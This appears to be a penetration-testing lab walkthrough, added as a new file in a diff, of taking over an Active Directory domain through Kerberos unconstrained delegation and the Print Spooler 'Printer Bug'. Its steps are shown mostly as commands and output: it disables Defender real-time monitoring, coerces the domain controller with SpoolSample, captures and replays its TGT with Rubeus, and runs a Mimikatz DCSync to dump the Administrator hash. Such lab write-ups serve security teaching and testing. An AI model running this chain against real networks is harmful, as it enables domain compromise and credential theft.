@@ -1,0 +1,205 @@
+=======================================================================================================================================
+Abusing Kerberos Unconstrained Delegation in Active Directory and the 'Printer Bug'
+=======================================================================================================================================
+
+=> Kerberos Unconstrained Delegation
+   Any user authentication (e.g. CIFS) to a Windows domain server with Kerberos unconstrained delegation enabled on it, will cache that user's Kerberos TGT in memory,
+   which can be dumped and reused (for example using the tool Mimikatz) by an adversary who has compromised this Windows server.
+
+=> Printer Bug
+   A bug in the printer server allowing any domain user to coerce any remote Windows server to perform NTLM authentication against an attacker controlled system (Windows computer).
+   A windows server must be running the Print Spooler (Spooler) service to be vulnerable.
+   
+Attack methodology
+====================
+1. Attacker discovers and compromises a system with Kerberos unconstrained delegation. 
+2. Attacker tests for and discovers a Domain Controller running the Print Spooler (Spooler) service.
+3. Attacker sends the MS-RPRN request RpcRemoteFindFirstPrinterChangeNotification (Kerberos auth) to the DC’s print server.
+4. The DC immediately sends a response to the requester. This response involves the DC creating a Kerberos service ticket (TGS) which contains the 
+   Domain Controller’s computer account Kerberos authentication ticket (TGT) since Kerberos is involved and the requesting account is configured with unconstrained delegation.
+5. The attacker now has the Domain Controller computer account Kerberos TGT which can be used to impersonate the DC.
+6. DCSync all account credentials (or other attack involving DA credentials as desired).  
+
+
+=======================================================================================================================================
+PoC - Step 1. Detection of a computer account with a Kerberos Unconstrained Delegation (TrustedForDelegation)
+=======================================================================================================================================
+
+There are several commands and tools that can be used during the Domain enumeration phase to identify a "Kerberos Unconstrained Delegation"
+
+=> BloodHound
+=> PingCastle 
+=> Powershell command (With AD-Module) such as: PS C:\AD\Tools> Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+
+=> PowerView
+   PS C:\AD\Tools> . .\PowerView.ps1
+   PS C:\AD\Tools> Get-NetComputer -Unconstrained
+   temp-dc.security-test-lab.local
+   webserver01.security-test-lab.local
+
+=> ADRecon.ps1  (File: Computers.csv)
+
+UserName		  Name			                          DNSHostName									          Enabled	IPv4Address		Delegation Type	            Delegation Protocol	Delegation Services			
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+webserver01$	webserver01.security-test-lab.local	webserver01.security-test-lab.local		TRUE	  192.168.1.55	Unconstrained	Kerberos			Any					
+<SNIP>
+
+=> In our testing lab, a Kerberos Unconstrained Delegation is enabled for the Windows server 'webserver01.security-test-lab.local'.
+
+
+=======================================================================================================================================
+PoC - Step 2. Exploitation of the "Printer Bug" on the Domain Controller
+=======================================================================================================================================
+
+=> First we check in our testing lab if the the Domain Controller 'TEMP-DC' is running the Print Spooler (Spooler) service.
+
+PS C:\Users\student109> ls \\temp-dc.security-test-lab.local\pipe\spoolss
+
+    Directory: \\temp-dc.security-test-lab.local\pipe
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+                                                 spoolss
+                                                 
+                                                 
+=> Then we compile and use the tool 'SpoolSample' of lee christensen which is available on his Github (https://github.com/leechristensen/SpoolSample)
+   If the attack works, the TGT of the Domain Controller account 'temp-dc$' should be cached in memory of the Windows server 'webserver01.security-test-lab.local'.
+
+PS C:\AD\Tools> .\SpoolSample_v4.5_x64.exe temp-dc.security-test-lab.local webserver01.security-test-lab.local
+[+] Converted DLL to shellcode
+[+] Executing RDI
+[+] Calling exported function
+TargetServer: \\temp-dc.security-test-lab.local, CaptureServer: \\webserver01.security-test-lab.local
+RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
+ 
+
+=======================================================================================================================================
+PoC - Step 3. Exploitation of the Kerberos Unconstrained Delegation mechanism and dump the TGT of the Domain Controller account
+=======================================================================================================================================
+
+=> First we log into the webserver01 with the account 'security-lab\webadmin' which has local administrator privileges and we upload the tool Rubeus.
+    
+    
+C:\AD\Tools>powershell -exec bypass
+Windows PowerShell
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\AD\Tools> $session1 = New-PSSession webserver01.security-test-lab.local -Credential security-lab\webadmin
+
+PS C:\AD\Tools> Enter-PSSession $session1
+[webserver01.security-test-lab.local]: PS C:\Users\webadmin\Documents> Set-MpPreference -DisableRealtimeMonitoring $true
+[webserver01.security-test-lab.local]: PS C:\Users\webadmin\Documents> exit
+
+PS C:\AD\Tools> Copy-Item -Path C:\AD\Tools\Rubeus.exe -Destination C:\Users\webadmin\Documents\ -ToSession $session1
+
+PS C:\AD\Tools> Enter-PSSession $session1
+[webserver01.security-test-lab.local]: PS C:\Users\webadmin\Documents> ls
+
+    Directory: C:\Users\webadmin\Documents
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         9/2/2020   7:50 PM         229888 Rubeus.exe
+
+
+=> Then, we use the tool Rubeus to dump all the TGT cached in the memory of the server webserver01. 
+   To be sure to dump the TGT of the Domain Controller account 'temp-dc$' we replay the Printer Bug attack again the Domain Controller using the tool 'SpoolSample'.
+
+
+[webserver01.security-test-lab.local]: PS C:\Users\webadmin\Documents> .\Rubeus.exe monitor /interval:5 /nowrap
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: TGT Monitoring
+[*] Monitoring every 5 seconds for new TGTs
+
+
+[*] 9/13/2020 9:43:36 PM UTC - Found new TGT:
+
+  User                  :  WEBADMIN@SECURITY-TEST-LAB.LOCAL
+  StartTime             :  9/13/2020 2:35:15 PM
+  EndTime               :  9/14/2020 12:35:15 AM
+  RenewTill             :  9/20/2020 2:35:15 PM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+    doIF3gjCCBX6gAwIBBaEDAgEWooIEazerdvj23WTCCBFVhggRRMIIETaADAgEFoRwb<SNIP>
+
+<SNIP>
+
+[*] 9/13/2020 9:43:46 PM UTC - Found new TGT:
+
+  User                  :  TEMP-DC$@SECURITY-TEST-LAB.LOCAL
+  StartTime             :  9/13/2020 1:27:49 PM
+  EndTime               :  9/13/2020 11:27:49 PM
+  RenewTill             :  9/20/2020 3:54:36 AM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+    doIFVjCCzeBVKgAwIBBaEDAgEWooIEUTC23CBE1hggRJMIIE09RaADAgEFoREbD01PT<SNIP>
+
+<SNIP>
+
+=> The attack worked !! We have the TGT of the Domain Controller account 'TEMP-DC$'.
+
+
+====================================================================================================================================================
+PoC - Step 4. Perform a Pass-The-Ticket attack using the TGT of the Domain Controller account and then do a DCsync attack to become Domain Admin
+====================================================================================================================================================
+
+=> First, perform a Pass-The-Ticket attack using the TGT of the Domain Controller account 'temp-dc$' and the tool Rubeus.
+
+PS C:\AD\Tools> .\Rubeus.exe ptt /ticket:doIFVjCCzeBVKgAwIBBaEDAgEWooIEUTC23CBE1hggRJMIIE09RaADAgEFoREbD01PT<SNIP>
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+
+=> Now we can perform a DCSync attack with Mimikatz to dump the password hash of a Domain Admin account (example 'security-lab\Administrator').
+
+PS C:\AD\Tools> . .\Invoke-Mimikatz.ps1
+PS C:\AD\Tools> Invoke-Mimikatz -Command '"lsadump::dcsync /user:security-lab\Administrator /domain:security-test-lab.local /dc:temp-dc.security-test-lab.local"'
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # lsadump::dcsync /user:security-lab\Administrator /domain:security-test-lab.local /dc:temp-dc.security-test-lab.local
+[DC] 'security-test-lab.local' will be the domain
+[DC] 'temp-dc.security-test-lab.local' will be the DC server
+[DC] 'security-lab\Administrator\Administrator' will be the user account
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 2/16/2019 10:13:28 PM
+Object Security ID   : S-1-5-21-280534878-1496970234-700767426-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: 71gh674f9d50ce<SNIP>
+
+
+=> We are now Domain Admin !!
